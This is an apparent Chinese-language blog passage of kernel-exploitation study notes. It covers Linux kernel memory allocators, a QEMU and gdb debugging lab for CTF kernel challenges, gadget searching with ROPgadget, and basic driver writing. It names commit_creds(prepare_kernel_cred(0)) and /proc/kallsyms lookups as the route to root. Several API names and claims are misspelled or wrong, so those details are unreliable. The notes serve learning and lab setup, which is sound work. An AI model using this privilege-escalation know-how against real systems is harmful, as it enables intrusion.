<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *kmalloc(size_t, int flags);</span><br></pre></td></tr></table></figure>

<p>常用的分配标志是GFP_KERNEL,其含义是在内存空间的进程中申请内存。<code>kmalloc()</code>的底层依赖于<code>__get_free_page()</code>.<code>GFP</code>是这个底层函数的缩写。使用<code>GFP_KERNEL</code>标志申请内存时，若暂时不能满足，进程会睡眠等待页，即会引起阻塞，因此不能在中断上下文或者持有自旋锁的时候使用<code>GFP_KERNEL</code>申请内存。</p>
<p>其他的一些标志<code>GFP_ATOMIC</code>，<code>GFP_USER</code>,<code>GFP_HIGHUSER</code>,<code>GFP_DMA</code>,等等。</p>
<p>使用<code>kfree()</code>释放空间</p>
<p><code>__get_free_pages()</code>系列函数&#x2F;宏是Linux内核最底层用于获取空闲内存的方法，底层的buddy算法以$2^{<em>}$页为单位管理空闲内存，所以内存申请也是以$2^{</em>}$为单位</p>
<p>其系列函数&#x2F;宏包括</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_zerod_page(unsigned int flags)//返回指向新页的指针并将该页清零</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__get_free_page(unsigned int flags);//返回新页但不清零</span><br></pre></td></tr></table></figure>
<p>实际上是调用<code>__get_free_pages()</code>申请了一页</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define __get_free_page(gfp_mask)  \</span><br><span class="line">		__get_free_pages((gfp_mask),0)</span><br></pre></td></tr></table></figure>

<p>其函数原型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__get_free_page(unsigned int flag, unsigned int order);</span><br></pre></td></tr></table></figure>



<p><code>__get_fee_page()</code>和<code>__get_zerod_page()</code>在实现中调用了<code>alloc_pages()</code>函数，<code>alloc_page()</code>函数既可以在内核空间中分配，也可以在用户空间分配，其原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct page &amp;alloc_page(int gfp_mask, unsigned long order);//参数于__get_free_page()类似，不过返回的是页描述符，不是首地址(指针)</span><br></pre></td></tr></table></figure>



<p>使用<code>__get_free_pages()</code>系列函数使用下列函数释放内存,在使用时相应的编制位和<code>kmalloc()</code>完全一致</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void free_page(unsigned long addr);</span><br><span class="line">void free_pages(unsigned long addr, unsigned long order);</span><br></pre></td></tr></table></figure>



<p>vmlloc()</p>
<p>vmlloc()只存在于软件中，没有硬件意义的较大的顺序缓冲区分配内存，<code>vmalloc()</code>远大于<code>__get_fee_page()</code>的开销，为了完成<code>vmalloc()</code>新的页表需要被建立。因此，调用<code>vmalloc()</code>一般适用于申请大内存(大于1页)，相应的释放函数用<code>vfree()</code></p>
<p>函数原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void *vmalloc(unsigned long size);</span><br><span class="line">void vfree(void *addr);</span><br></pre></td></tr></table></figure>

<p>vmalloc不支持原子操作，它的底层实现kmalloc</p>
<h3 id="slab分配器与内存池"><a href="#slab分配器与内存池" class="headerlink" title="slab分配器与内存池"></a>slab分配器与内存池</h3><p>背景：</p>
<ul>
<li>完全使用<em>页</em>申请和释放内存容易导致浪费</li>
<li>操作系统的运行过程中，经常涉及大量对象的重复生成，使用和释放内存问题(如inode,task_struct),如果使用合适的方法使得对象前后被分配在同一块内存或同一类内存空间且保留了基本的数据结构，可以提升效率</li>
</ul>
<p>slab就是建立在buddy算法上的，他从buddy算法拿到$2^{*}$页面后进行二次管理，这一点和用户空间的C库很像，slab申请的内存以及基于slab的<code>kmalloc()</code>申请的内存，与物理内存之间也是一个简单的线性偏移</p>
<h3 id="创建slab缓存"><a href="#创建slab缓存" class="headerlink" title="创建slab缓存"></a>创建slab缓存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct kmem_cache *kmem_cache_create(const char *name, size_t size</span><br><span class="line">		size_t align, unsigned long flags,</span><br><span class="line">		void (*ctor)(void*, struct kmem_cache *, unsigned long),</span><br><span class="line">		void (*dtor)(void*, struct kmem_cache *, unsigned long));</span><br></pre></td></tr></table></figure>

<p><code>kmem_cache_create()</code>用于创建一个slab缓存，它是一个可以保留任意数目且<em><strong>全部同样大小</strong></em>的后被缓存。参数size是要分配的每个数据结构的大小，参数flags是控制如何进行分配的位掩码，包括<code>SLAB_HWCHACHE_ALIGN</code>（每一个数据对象被对齐到一个缓存行）<br><code>SLAB_CACHE_DMA</code>（要求数据对象在DMA区域中分配）等</p>
<h4 id="分配slab缓存"><a href="#分配slab缓存" class="headerlink" title="分配slab缓存"></a>分配slab缓存</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *kmem_cache_alloc(struct kmem_cache *cachep, gfp_t flags);</span><br></pre></td></tr></table></figure>

<p>上述函数在<code>kmem_cache_create()</code>创建的slab后备缓存中分配一块并返回首地址指针</p>
<h3 id="释放slab缓存"><a href="#释放slab缓存" class="headerlink" title="释放slab缓存"></a>释放slab缓存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void kmem_cache_free(struct kmem_cache *cachep, void *objp);</span><br></pre></td></tr></table></figure>

<h3 id="回收slab缓存"><a href="#回收slab缓存" class="headerlink" title="回收slab缓存"></a>回收slab缓存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int kmem_cache_destory(struct kmem_cache *cachep);</span><br></pre></td></tr></table></figure>

<h3 id="slab缓存使用范例"><a href="#slab缓存使用范例" class="headerlink" title="slab缓存使用范例"></a>slab缓存使用范例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建slab缓存</span></span><br><span class="line"><span class="type">static</span> <span class="type">kmem_cache_t</span> *xxx_cachep;</span><br><span class="line">xxx_cachep = kmem_cache_create(<span class="string">&quot;xxx&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> xxx),<span class="number">0</span>,SLAB_HWCACHE_ALIGN|SLAB_PANIC,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//分配slab缓存</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xxx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">ctx = kmem_cache_alloc(xxx_cachep,GFP_KERNEL);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用slab缓存</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放slab缓存</span></span><br><span class="line">kmem_cache_free(xxx_cachep, ctx);</span><br><span class="line"></span><br><span class="line">kmem_cache_destory(xxx_cachep); <span class="comment">//销毁cache</span></span><br></pre></td></tr></table></figure>

<p>注意：slab的底层依然是<code>__get_free_pages()</code>,他只是对内存进行管理，对标glibc下的ptmalloc</p>
<h1 id="kernel-pwn环境搭建"><a href="#kernel-pwn环境搭建" class="headerlink" title="kernel_pwn环境搭建"></a>kernel_pwn环境搭建</h1><p>我们学习kernel，一般不直接拿自己电脑。能上虚拟机肯定是上虚拟机。</p>
<p>我们使用qume作为运行内核的的虚拟机</p>
<ul>
<li>下载源码</li>
<li>编译内核</li>
</ul>
<h2 id="调试方法："><a href="#调试方法：" class="headerlink" title="调试方法："></a>调试方法：</h2><p>由于它是内核态，所以，为了调试方便通常我们都是运行内核时给自己加上root权限。这是前提</p>
<h3 id="获取vmlinux"><a href="#获取vmlinux" class="headerlink" title="获取vmlinux"></a>获取vmlinux</h3><p>vmlinux，静态链接的 Linux kernel，是未压缩的内核，载入可以用于gdb的调试。</p>
<p>那么，怎么获取呢？</p>
<p>一般是可以从给定bzImage中提取的。</p>
<p>脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">----------------------------------------------------------------------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Inspired from extract-ikconfig</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># ----------------------------------------------------------------------</span></span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line">    # Use readelf to check if it&#x27;s a valid ELF</span><br><span class="line">    # TODO: find a better to way to check that it&#x27;s really vmlinux</span><br><span class="line">    #       and not just an elf</span><br><span class="line">    readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">    cat $1</span><br><span class="line">    exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line">    # The obscure use of the &quot;tr&quot; filter is to work around older versions of</span><br><span class="line">    # &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span><br><span class="line"></span><br><span class="line">    # Try to find the header ($1) and decompress from here</span><br><span class="line">    for pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`</span><br><span class="line">    do</span><br><span class="line">        pos=$&#123;pos%%:*&#125;</span><br><span class="line">        tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null</span><br><span class="line">        check_vmlinux $tmp</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check invocation:</span></span><br><span class="line">me=$&#123;0##*/&#125;</span><br><span class="line">img=$1</span><br><span class="line">if  [ $# -ne 1 -o ! -s &quot;$img&quot; ]</span><br><span class="line">then</span><br><span class="line">    echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2</span><br><span class="line">    exit 2</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line">trap &quot;rm -f $tmp&quot; 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">That didn<span class="string">&#x27;t work, so retry after decompression.</span></span></span><br><span class="line">try_decompress &#x27;\037\213\010&#x27; xy    gunzip</span><br><span class="line">try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz</span><br><span class="line">try_decompress &#x27;BZh&#x27;          xy    bunzip2</span><br><span class="line">try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma</span><br><span class="line">try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;</span><br><span class="line">try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;</span><br><span class="line">try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Finally check for uncompressed images or objects:</span></span></span><br><span class="line">check_vmlinux $img</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Bail out:</span></span></span><br><span class="line">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>自己创建一个软连接，方便使用</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  vml bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>

<h3 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h3><p>在qemu的启动配置中，我们可以加上<code>-s</code> 参数(等效于<code>-gdb tcp::1234</code>),开启tcp监听端口，这样我们就可以在本机另开一个端口进行调试。</p>
<p><code>gdb -q -ex &quot;target remote localhost:1234&quot;</code></p>
<p>这个1234端口是<code>-s</code>默认的端口。</p>
<p>同时，我们可以在gdb中使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file vmlinux addr_of_vmlinux </span><br><span class="line">add-symbol-file ./your_module.ko addr_of_ko</span><br></pre></td></tr></table></figure>

<p>来添加符号信息。</p>
<h3 id="获取驱动加载的基地址"><a href="#获取驱动加载的基地址" class="headerlink" title="获取驱动加载的基地址"></a>获取驱动加载的基地址</h3><p>这就是为什么，我们要在调试的给自己加上root权限了</p>
<p>在linux一切皆文件的思想下，我们的运行的进程等也可以通过文件查询，但是有的信息需要root权限才能看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># method 1</span><br><span class="line">grep target_module_name /proc/modules </span><br><span class="line"></span><br><span class="line"># method 2</span><br><span class="line">cat /sys/module/target_module_name/sections/.text </span><br></pre></td></tr></table></figure>

<p>在qemu中输入<code>lsmod</code>查看驱动的基地址</p>
<p>这样我们就能看到驱动加载的基地址了，gdb调试的时候需要用到</p>
<p>试样</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">start.sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line">-gdb tcp::2222 //这里用来调试，调试的时候先gdb ./vmlinux -q,进入之后add-symbols-file 漏洞文件 程序基地址（lsmod）</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>找gadget可以用ROPgadget或者是ropper</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./vmlinux &gt; gadget.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ropper --file ./vmlinuz --nocolor &gt; gadget2.txt</span></span><br></pre></td></tr></table></figure>



<p>调试用init文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">挂在指令</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在kernle中我们一般使用commit_creds(prepare_kernel_cred(0))来提权</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这个相当于用户态的system(<span class="string">&quot;sh&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在proc/kallsyms存放着我们需要的函数，因此可以直接在窗口用</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /proc/kallsyms |grep commit_cred来寻找函数地址</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可以使用lsmod来显示程序基地址</span></span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里加载了一个驱动一般是需要pwn 的文件</span></span><br><span class="line">insmod /core.ko</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">poweroff -d 120 -f &amp; <span class="comment">#注释掉</span></span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh #这里把1换成0可以再我们调试的时候直接root权限即</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">setsid /bin/cttyhack setuidgid 0000 /bin/sh</span></span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>



<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>程序在内核态和用户态的反复跳转根本上还是CPU(更准确地说的是寄存器)在用户地址和内核地址的反复跳转执行</p>
<p>这之间需要一个操作将每次跳转前的信息保存下来</p>
<p>​		使用内存栈或(寄存器)保存信息</p>
<h1 id="简单驱动的编写"><a href="#简单驱动的编写" class="headerlink" title="简单驱动的编写"></a>简单驱动的编写</h1><p>会涉及三个<code>linux/init.h</code>,<code>linux/module.h</code>,<code>linux/kernel.h</code>这三个linux库</p>
<p>可能还是需要重新复习以下<code>Makefile</code>的编写<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012142460/article/details/78839997">内核makefile入门</a></p>
<p>大概的过程：</p>
<ul>
<li><p>先分配一个驱动号</p>
<p>  <code>int alloc_chrdev_region(dev_t *dev, unsigned baseminor, unsigned count,     const char *name)</code></p>
</li>
<li><p>注册字符设备(初始化一个驱动所需要的cdev结构体,并绑定设备号)</p>
<p>  <code>cdev_init(&amp;cdev_0, &amp;fops);</code></p>
</li>
<li><p>驱动上线</p>
<p>  <code>int cdev_add(struct cdev *p, dev_t dev, unsigned count)</code></p>
</li>
<li><p>将驱动设备注册进sysfs(文件系统)</p>
<p><code>class_create</code> 和 <code>device_create</code></p>
</li>
</ul>
<p>框架</p>
<p>int ioctl(int fd,unsigned long request,….)</p>
<p>ioctl如果简单理解的话，就是给用户和驱动程序传递消息的函数，由用户程序调用<code>fd</code>代表的是打开驱动的文件描述符，request是对驱动提出的相应请求，<code>fd</code>是打开文件时返回的，request是驱动函数编写时确定的。</p>
<h1 id="了解slub分配器机制及其使用"><a href="#了解slub分配器机制及其使用" class="headerlink" title="了解slub分配器机制及其使用"></a>了解slub分配器机制及其使用</h1><p>有别用户空间，内核空间的内存使用通常都比较小巧，但是哪怕它是内核它也会需要使用内存</p>
<p>这就涉及到一些内存分配机制。</p>
<p>slub的前身是slab，</p>
<p>每一个申请的内核空间都是需要一个结构体进行管理的，这个结构体就是<code>kmem_cache</code></p>
<p>它由<code>kmem_cache_create()</code>创建，由<code>kmem_cache_destroy()</code>销毁</p>
<p>当然，这只是一个管理的结构体，并不储存数据，只是记录缓冲区的一些信息。</p>
<p>真正申请内存的是<code>kmem_cache_alloc()</code>,它申请出相应的内存，并将其数据(类似ptr,size)记录进<code>kmem_cache</code></p>
<p><code>kmem_cache_free</code>负责将申请的内存空间释放。</p>
<p>这里说一下，所有的kmem_cache都被串在一个名为slab_caches的双向链表上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  	<span class="comment">/*per-cpu变量，用来实现每个CPU上的slab缓存。好处如下：</span></span><br><span class="line"><span class="comment">        1.促使cpu_slab-&gt;freelist可以无锁访问，避免了竞争，提升分配速度</span></span><br><span class="line"><span class="comment">        2.使得本地cpu缓存中分配出的objects被同一cpu访问，提升TLB对object的命中率(因为一个page中有多个object，他们共用同一个PTE)</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*下面这些是初始化kmem_cache时会设置的一些变量 */</span></span><br><span class="line">    	<span class="comment">/*分配时会用到的flags*/</span></span><br><span class="line">    	</span><br><span class="line">        <span class="type">slab_flags_t</span> flags;</span><br><span class="line">        </span><br><span class="line">    	<span class="comment">/*kmem_cache_shrink缩减partial slabs时，将被保有slab的最小值。由函数set_min_partial(s, ilog2(s-&gt;size)/2)设置。*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line">        </span><br><span class="line">    	<span class="comment">/*object的实际大小，包含元数据和对齐的空间*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">        </span><br><span class="line">    	<span class="comment">/*object中payload的大小，即目标数据结构的实际大小*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> object_size;</span><br><span class="line">    	<span class="comment">/*每个free object中都存了next free object的地址，但是并未存在object的首地址，而是首地址加上offset的地方*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">	<span class="comment">/*此结构体实际是个unsigned int，里面存了单个slab的占用的order数和一个slab中object的数量*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span> </span><br><span class="line">        <span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">        </span><br><span class="line">    	<span class="comment">/*标准gfp掩码，用于从buddy分配页面时*/</span></span><br><span class="line">        <span class="type">gfp_t</span> allocflags;       <span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">        <span class="type">int</span> refcount;           <span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">    	</span><br><span class="line">    	<span class="comment">/*object的构造函数，通常不使用*/</span></span><br><span class="line">        <span class="type">void</span> (*ctor)(<span class="type">void</span> *); </span><br><span class="line">    	<span class="comment">/*object中到metadata的偏移*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> inuse;</span><br><span class="line">    	<span class="comment">/*对齐大小。澄清：slab中对齐方式通常有两种。1是按处理器字长对齐;2是按照cacheline大小对齐。*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> align;</span><br><span class="line">        </span><br><span class="line">    	<span class="comment">/*若flags中使用REDZONE时有意义*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> red_left_pad;      <span class="comment">/* Left redzone padding size */</span></span><br><span class="line">        </span><br><span class="line">	<span class="comment">/*对象名称，例：mm_struct task_struct*/</span></span><br><span class="line">    	<span class="type">const</span> <span class="type">char</span> *name;      </span><br><span class="line">    	</span><br><span class="line">	<span class="comment">/*kmem_cache的链表结构，通过此成员串在slab_caches链表上*/</span></span><br><span class="line">    	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span> </span><br><span class="line">    	</span><br><span class="line">    	</span><br><span class="line">	<span class="comment">/*下面两个成员用于表示对象内部的一块空间，使userspace可以访问其中的内容。具体可以看kmem_cache_create_usercopy的实现*/</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> useroffset;  </span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> usersize;         </span><br><span class="line">        </span><br><span 